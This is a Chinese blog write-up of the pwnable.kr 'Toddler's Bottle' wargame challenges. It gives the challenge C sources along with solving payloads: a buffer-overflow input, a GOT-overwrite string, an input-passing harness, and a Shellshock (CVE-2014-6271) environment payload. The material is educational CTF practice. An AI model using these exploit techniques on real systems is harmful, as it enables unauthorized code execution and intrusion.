---
layout: post
title: Toddler's Bottle Writeup [pwnable.kr]
tags: [security, writeup]
---

[pwnable.kr](http://pwnable.kr) 是一个非商业性的 Wargame 网站，提供了大量的 Pwn 类型的挑战，可以在该网站上练习和学习 Pwn 技术。

（PS：文章内容会随着做题进度进行更新）

### [fd]

> Mommy! what is a file descriptor in Linux?
> 
> ssh fd@pwnable.kr -p2222 (pw:guest)

通过 ssh 连接到答题环境后，可以在当前目录看到三个文件 fd、fd.c、flag。

fd 是一个可执行文件，用于读取 flag 文件，其源码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;

}
```

程序通过 `argv[1]` 获取一字符串并使用 `atoi()` 函数将其转化为整型于 `0x1234` 作差，其结果赋值给整型变量 `fd`。

随后程序从 `fd` 文件描述符中读取32字节到 `buf` 中，并与字符串 `LETMEWIN\n` 进行比较，若相等则打印 flag 文件的内容，否则失败。

在 Linux 系统下，使用 `open()` 函数成功打开文件后会返回针对该文件的文件描述符（整型）,若打开失败会返回 `-1`。文件描述符 `0`，`1`，`2`分别对应系统的标准输入，标准输出，和标准错误输出。

此题可利用标准输入来将字符串 `LETMEWIN\n` 写到标准输入中，然后使得 `fd` 变量值为 `0` 即可从标注输入中读入。

    fd@ubuntu:~$ echo "LETMEWIN" | ./fd 4660
    good job :)
    mommy! I think I know what a file descriptor is!!
    
或者：

    fd@ubuntu:~$ ./fd 4660
    LETMEWIN
    good job :)
    mommy! I think I know what a file descriptor is!!


### [collision]

> Daddy told me about cool MD5 hash collision today.
>
> I wanna do something like that too!
>
> ssh col@pwnable.kr -p2222 (pw:guest)

登录后，查看当前目录下的 `col.c` 源文件。

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```

程序从 `argv[1]` 中得到一长度为20字节的字符串，并将其拆成5组数据，将5组数据的整型值相加与目标值 `0x21DD09EC` 进行比较，相等则打印 flag，不等则失败。

此题直接将 `0x21DD09EC` 拆成5个数字的和即可，通过 `argv[1]` 输入时，需要注意使用小端序。

    ./col `python -c "print '\xc8\xce\xc5\x06' * 4 + '\xcc\xce\xc5\x06'"`
    daddy! I just managed to create a hash collision :)
    
    
### [bof]

> Nana told me that buffer overflow is one of the most common software vulnerability. 
>
> Is that true?
>
> Download : http://pwnable.kr/bin/bof
> 
> Download : http://pwnable.kr/bin/bof.c
>
> Running at : nc pwnable.kr 9000

将 `bof` 文件下载下来，用 `file` 命令查看一下，可以看到是一个32位的 ELF 可执行文件，拖到 Ubuntu 中进行调试。

![img](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-1.png)

简单运行发现程序需要我们输入一些字符串，根据提示可以知道此题需要进行溢出。直接抄起 `gdb` 调试之。尝试直接使用 `b main` 在主函数处设置断点。

![img](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-2.png)

`r` 开始运行，程序断在了主函数入口处，使用 `n` 进行单步跟踪，当走到 `0x8000069a` 处时，程序 `call 0x8000062c <func>` 调用了 `0x8000062c` 处的函数，直接 `s` 单步进入继续跟。

![img](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-3.png)

当走到 `0x8000064c` 程序将寄存器 eax 的值 `0xbffff55c` 压入栈，随后进行 `call   0xb7e78cd0 <_IO_gets>`，此处为 c 语言中的 gets() 函数调用，最终 `0xbffff55c` 会指向用户输入的字符串。这里使用peda中的 `pattern create 64` 创建一个64字节的测试 payload 将其输入到程序中，方便后续调试。

![img](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-4.png)

输入完字符串后，程序停在了 `0x80000654` 进行了一个简单的比较操作 `cmp DWORD PTR [ebp+0x8],0xcafebabe`，比较 `DWORD PTR [ebp+0x8]` 处的值是否等于 `0xcafebabe`，而此时的 `DWORD PTR [ebp+0x8]` 地址为 `0xbffff590`，回顾一下刚刚指向用户输入字符串的地址 `0xbffff55c`。输入的字符串地址处在一个低地址上，如果输入足够长的字符串，就能够覆盖到后面 `0xbffff590` 处的值。

当比较成功时，程序不会发生跳转，调用 `call 0xb7e54190 <__libc_system>`，而其参数为 `/bin/sh`，如下图。

![img](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-5.png)

理清过程后，剩下的就只需要找到输入字符串指针距离 `0xbffff590` 的偏移即可。由于之前使用了特殊的 payload，这时候我们查看一下输入字符串周围的堆栈情况。

![img](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-6.png)

可以看到刚才输入的 payload 已经覆盖到了 `0xbffff590` 处的值，但是并不是程序需要的 `0xcafebabe`，使用 `pattern offset` 来计算偏移。

![img](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-7.png)

可以看到，`0xbffff590` 距离字符串开头的偏移为52个字节，因此为了成功地使程序跳转执行system("/bin/sh")，我们构造的输入字符串就应该为：

    "A" * 52 + "\xbe\xba\xfe\xca"
    
此时，直接使用命令行远程打 payload：

    (python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
    
![img](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-8.png)

（当然，题目提供了 c 源码，也可以直接阅读源码进行分析）

### [flag]

> Papa brought me a packed present! let's open it.
>
> Download : http://pwnable.kr/bin/flag
>
> This is reversing task. all you need is binary

使用 `file` 命令查看下载回来的 `flag` 文件，发现是一个64位的 ELF 可执行程序。通过查看，发现其具有明显的 UPX 压缩标志，所以解压之。

![](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-1.png)

通过 UPX 成功解压缩后得到 `flag-upx`，拖入 IDA 进行静态分析，发现在 `0x0000000000401184` 处引用了一个 `flag` 变量，通过 IDA 的交叉引用功能找到了该字符串，此值即为 flag。

![](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-2.png)

	UPX...? sounds like a delivery service :)


### [passcode]

> Mommy told me to make a passcode based login system.
>
> My initial C code was compiled without any error!
>
> Well, there was some compiler warning, but who cares about that?
>
> ssh passcode@pwnable.kr -p2222 (pw:guest)


```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```

对 C 语言熟悉的同学都能很轻易的发现，程序在调用 `scanf()` 函数来获取用户输入时，第二个参数没有传递参数地址而直接传递了参数，可能导致内存异常写入。

通过 `gdb` 调试可以发现，输入的用户名 `name` 位于 `ebp-0x70`，`password1` 位于 `ebp-0x10`，`password2` 位于 `ebp-0xc`，由于这样的堆栈布局，导致了在输入用户名时可以覆盖到 `ebp-0x10`，也就是能控制 `password1` 的值，最终导致任意4字节写。

这里由于堆栈不能执行，不能更改 GOT 指向 shellcode，但是可以直接修改 GOT 后将程序流程跳转到输出 flag 的部分，即 `system("/bin/cat flag");`，我们查看一下代码所处位置：

![](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/passcode-1.png)

可以看到代码处于 `0x080485e3`，我们通过更改 `printf()` 函数的 GOT 来让我们输入完 `password1` 后的 `printf()` 函数调用流程转到 `system("/bin/cat flag");` 处。

`name` 与 `password1` 相差 `96 bytes`，所有构造的 payload 如下：

	python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode

![](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/passcode-2.png)


### [random]

> Daddy, teach me how to use random value in programming!
>
> ssh random@pwnable.kr -p2222 (pw:guest)

```c
#include <stdio.h>

int main(){
    unsigned int random;
    random = rand();    // random value!

    unsigned int key=0;
    scanf("%d", &key);

    if( (key ^ random) == 0xdeadbeef ){
        printf("Good!\n");
        system("/bin/cat flag");
        return 0;
    }

    printf("Wrong, maybe you should try 2^32 cases.\n");
    return 0;
}
```

此题考察 c 语言中随机数生成的问题，`rand()` 若没有提供参数会在当前环境使用同一随机种子来生成随机数，而通过在 `/tmp` 目录下进行测试，服务器上 `rand()` 生成的默认随机数值为 `1804289383`，需要输入的 `key` 值就应为：`1804289383 ^ 0xdeadbeef = 3039230856`。

    random@ubuntu:~$ ./random
    3039230856
    Good!
    Mommy, I thought libc random is unpredictable...
    

### [input]

> Mom? how can I pass my input to a computer program?
>
> ssh input@pwnable.kr -p2222 (pw:guest)

此题提供了一段较长的代码，考察 linux 下基础编程知识，其完整代码如下。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
    printf("Welcome to pwnable.kr\n");
    printf("Let's see if you know how to give input to program\n");
    printf("Just give me correct inputs then you will get the flag :)\n");

    // argv
    if(argc != 100) return 0;
    if(strcmp(argv['A'],"\x00")) return 0;
    if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
    printf("Stage 1 clear!\n");

    // stdio
    char buf[4];
    read(0, buf, 4);
    if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
    read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
    printf("Stage 2 clear!\n");

    // env
    if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
    printf("Stage 3 clear!\n");

    // file
    FILE* fp = fopen("\x0a", "r");
    if(!fp) return 0;
    if( fread(buf, 4, 1, fp)!=1 ) return 0;
    if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
    fclose(fp);
    printf("Stage 4 clear!\n");

    // network
    int sd, cd;
    struct sockaddr_in saddr, caddr;
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if(sd == -1){
        printf("socket error, tell admin\n");
        return 0;
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;
    saddr.sin_port = htons( atoi(argv['C']) );
    if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
        printf("bind error, use another port\n");
            return 1;
    }
    listen(sd, 1);
    int c = sizeof(struct sockaddr_in);
    cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
    if(cd < 0){
        printf("accept error, tell admin\n");
        return 0;
    }
    if( recv(cd, buf, 4, 0) != 4 ) return 0;
    if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
    printf("Stage 5 clear!\n");

    // here's your flag
    system("/bin/cat flag");
    return 0;
}
```

程序判断了命令行参数和两个特定位的参数值，由于不可打印符的存在，所以将此题需要进行 c 编程，将需要的变量参数和环境变量通过 `execve()` 函数传递给 `/home/input/input` 程序。

例如针对下面这段参数判断：

    if(argc != 100) return 0;
    if(strcmp(argv['A'],"\x00")) return 0;
    if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
    printf("Stage 1 clear!\n");
    
可以使用如下程序进行 bypass：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
   char* argv[101] = {[0 ... 99] = "A"};
   argv['A'] = "\x00";
   argv['B'] = "\x20\x0a\x0d";
   argv['C'] = "31337";

   execve("/home/input/input", argv, NULL);


   return 0;
}
```

将以上代码 `copy` 到服务器的 `/tmp` 目录下，然后编译运行：

	input@ubuntu:/tmp/rrr$ ./bypass_input
	Welcome to pwnable.kr
	Let's see if you know how to give input to program
	Just give me correct inputs then you will get the flag :)
	Stage 1 clear!

输入输出部分需要使用亲子进程间的通信，这里有一片文章介绍的非常详细-[《Linux环境进程间通信（一）》](http://www.ibm.com/developerworks/cn/linux/l-ipc/part1/)，这里就不过多阐述了。

环境变量直接定义 `char* envp[2] = {"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"};` 即可通过 Stage 3。

文件部分直接使用如下代码，进行文件创建并将要求的字符写入即可：

    FILE* fp = fopen("\x0a", "wb");
    if(!fp) {
        printf("file create error!\n");
        exit(-1);
    }
    fwrite("\x00\x00\x00\x00", 4, 1, fp);
    fclose(fp);

在 Stage 5 部分，直接利用 python 程序向预先设置好的监听端口 `31337` 发送对应字符 `\xde\xad\xbe\xef` 即可通过。

最终的利用程序如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    char* argv[101] = {[0 ... 99] = "A"};
    argv['A'] = "\x00";
    argv['B'] = "\x20\x0a\x0d";
    argv['C'] = "31337";

    char* envp[2] = {"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"};

    int pipe1[2], pipe2[2];
    if(pipe(pipe1) < 0 || pipe(pipe2) < 0) {
        printf("pipe error!\n");
        exit(-1);
    }

    FILE* fp = fopen("\x0a", "wb");
    if(!fp) {
        printf("file create error!\n");
        exit(-1);
    }
    fwrite("\x00\x00\x00\x00", 4, 1, fp);
    fclose(fp);

    if(fork() == 0) {
        // Parent processing
        printf("Parent processing is here...\n");
        dup2(pipe1[0], 0);
        close(pipe1[1]);

        dup2(pipe2[0], 2);
        close(pipe2[1]);

        execve("/home/input/input", argv, envp);
    } else {
        // Child processing
        printf("Parent processing is here...\n");
        write(pipe1[1], "\x00\x0a\x00\xff", 4);
        write(pipe2[1], "\x00\x0a\x02\xff", 4);

        sleep(30); 
    }


    return 0;
}
```

将其 copy 到服务器 `/tmp` 目录下，编译运行，并将 `/home/input/flag` 文件链接到该目录下。Stage 1,2,3,4 会依次通过并在子进程中开始 `sleep(30)`，这时候另起终端使用借助 `python` 和 `nc` 直接向本地 `31337` 端口发送数据：

	python -c "print '\xde\xad\xbe\xef'" | nc 127.0.0.1 31337

![](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/input-1.png)

### [mistake]

> We all make mistakes, let's move on.
> 
> (don't take this too seriously, no fancy hacking skill is required at all)
>
> This task is based on real event
> Thanks to dhmonkey
>
> hint : operator priority
>
> ssh mistake@pwnable.kr -p2222 (pw:guest)

`mistake.c` 代码：

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){

	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}
```

大致一看，发现程序流程是从 `password` 文件中读取10字节，然后让用户输入10字节，取其与1的异或值与 `password` 文件中的头10字节进行比较，若相等则返回 flag。

但是呢，这里有一个问题，题目中也给出了提示-"操作符运算级别"，程序在尝试打开 `password` 文件时，代码如下：

    if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)
    
由于 小于符号`<` 优先级高于 赋值号`=`，所以成功打开文件后 `open()` 函数返回值大于0，fd 最终会被赋值为 `0`，因此在下面 read(fd) 的过程中从 stdin 输入缓冲区获取 `password` 的头10字节，这样就能预先控制 `password` 的10字节，拿到 flag。

    mistake@ubuntu:~$ ./mistake
    do not bruteforce...
    0000000000
    input password : 1111111111
    Password OK
    Mommy, the operator priority always confuses me :(\
    
### [shellshock]

> Mommy, there was a shocking news about bash.
> I bet you already know, but lets just make it sure :)
> 
> ssh shellshock@pwnable.kr -p2222 (pw:guest)

很明显该题考察 Bash 破壳漏洞 CVE-2014-6271，漏洞相关详情可参考[这里](https://access.redhat.com/articles/1200223)。

连上服务器后，路径有下面几个文件：

	shellshock@ubuntu:~$ ls -al
	total 976
	drwxr-x---  4 root shellshock    4096 Oct 12  2014 .
	dr-xr-xr-x 58 root root          4096 Feb  5 08:35 ..
	-r-xr-xr-x  1 root shellshock2 959120 Oct 12  2014 bash
	d---------  2 root root          4096 Oct 12  2014 .bash_history
	-r--r-----  1 root shellshock2     47 Oct 12  2014 flag
	dr-xr-xr-x  2 root root          4096 Oct 12  2014 .irssi
	-r-xr-sr-x  1 root shellshock2   8547 Oct 12  2014 shellshock
	-rw-r-----  1 root shellshock     188 Oct 12  2014 shellshock.c
	shellshock@ubuntu:~$

可以看到 `shellshock` 和 `flag` 的 GROUP 都为 `shellshock2`，而当前用户组为 `shellshock`，这里通过查看 `shellshock.c` 源码发现，可以利用 shellshock 漏洞来在 `shellshock` 程序的环境中设置好 UID 和 GID 然后去执行 `cat flag`。`shellshock.c` 源码如下：

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

`/home/shellshock/bash` 经过测试存在 shellshock 漏洞：

![](/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/shellshock-1.png)

因此直接构造 Payload：`env x='() { :;}; /bin/cat flag' ./shellshock` 即可得到 flag：

	shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
	only if I knew CVE-2014-6271 ten years ago..!!
	Segmentation fault
	shellshock@ubuntu:~$

